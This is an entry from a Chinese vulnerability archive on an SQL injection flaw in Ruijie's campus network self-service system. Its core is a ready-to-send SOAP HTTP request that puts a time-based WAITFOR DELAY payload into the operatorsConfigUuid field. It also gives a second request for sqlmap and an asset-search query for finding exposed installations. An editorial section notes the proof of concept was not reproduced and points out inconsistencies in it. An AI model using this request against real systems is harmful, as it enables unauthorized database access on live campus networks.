---
source: "wy876 漏洞文库"
id: "vw-bbe5248df052aded94c821dc"
entity_id: "ve-bbe5248df052aded94c821dc"
schema_version: "1"
title: "锐捷网络股份有限公司校园网自助服务系统queryAccountNumReportDataDetail存在SQL注入漏洞"
product: "Ruijie校园网自助服务系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "JSESSIONID、SQL Server WAITFOR，版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Ruijie/%E9%94%90%E6%8D%B7%E7%BD%91%E7%BB%9C%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%87%AA%E5%8A%A9%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9FqueryAccountNumReportDataDetail%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "延时探针会占用线程或数据库连接；需记录基线和对照，单次慢响应或超时不足判定注入"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/xtp0qz0at8exgx9o"
source_status: "recorded"
---

# 锐捷网络股份有限公司校园网自助服务系统queryAccountNumReportDataDetail存在SQL注入漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Ruijie校园网自助服务系统
- 本文讨论：queryAccountNumReportDataDetail operatorsConfigUuid SQL注入
- 版本、权限与配置前提：JSESSIONID、SQL Server WAITFOR，版本未知
- 资料类型：SOAP SQL注入PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 同服务不同SOAP方法，不能和785只按URL合并
- 两个同名JSESSIONID会话歧义；endTime2008早于startTime2014，业务前提不合理需解释
- 无时延对照/结果；sqlmap标题下无实际命令；软件误归IoT
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断

### 操作风险与恢复

- 延时探针会占用线程或数据库连接；需记录基线和对照，单次慢响应或超时不足判定注入

### 待核与来源

- 鉴权、业务校验顺序、固件/软件范围待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
锐捷网络股份有限公司校园网自助服务系统queryAccountNumReportDataDetail存在SQL注入漏洞。

# 二、影响版本
+ 锐捷网络股份有限公司校园网自助服务系统

# 三、资产测绘
+ hunter`app="校园网自助服务系统"`
+ 特征


# 四、漏洞复现
```http
POST /selfservice/service/operatorReportorRoamService HTTP/1.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: JSESSIONID=42E**************************480; JSESSIONID=061**************************0FB
Connection: close
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 873

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.webservice.common.spl.ruijie.com" xmlns:dom="http://domain.service.webservice.common.spl.ruijie.com">
   <soapenv:Header/>
   <soapenv:Body>
      <ser:queryAccountNumReportDataDetail>
         <ser:in0>
            <!--type: dateTime-->
            <dom:endTime>2008-09-29T09:49:45</dom:endTime>
            <!--type: int-->
            <dom:limit>3</dom:limit>
            <!--type: int-->
            <dom:offSet>3</dom:offSet>
            <!--type: string-->
            <dom:operatorsConfigUuid>aeoliam venit';WAITFOR DELAY '0:0:5'--</dom:operatorsConfigUuid>
            <!--type: dateTime-->
            <dom:startTime>2014-06-09T23:15:04+08:00</dom:startTime>
         </ser:in0>
      </ser:queryAccountNumReportDataDetail>
   </soapenv:Body>
</soapenv:Envelope>
```


sqlmap

```http
POST /selfservice/service/operatorReportorRoamService HTTP/1.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: JSESSIONID=42E**************************480; JSESSIONID=061**************************0FB
Connection: close
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 873

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.webservice.common.spl.ruijie.com" xmlns:dom="http://domain.service.webservice.common.spl.ruijie.com">
   <soapenv:Header/>
   <soapenv:Body>
      <ser:queryAccountNumReportDataDetail>
         <ser:in0>
            <!--type: dateTime-->
            <dom:endTime>2008-09-29T09:49:45</dom:endTime>
            <!--type: int-->
            <dom:limit>3</dom:limit>
            <!--type: int-->
            <dom:offSet>3</dom:offSet>
            <!--type: string-->
            <dom:operatorsConfigUuid>aeoliam venit</dom:operatorsConfigUuid>
            <!--type: dateTime-->
            <dom:startTime>2014-06-09T23:15:04+08:00</dom:startTime>
         </ser:in0>
      </ser:queryAccountNumReportDataDetail>
   </soapenv:Body>
</soapenv:Envelope>
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xtp0qz0at8exgx9o>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
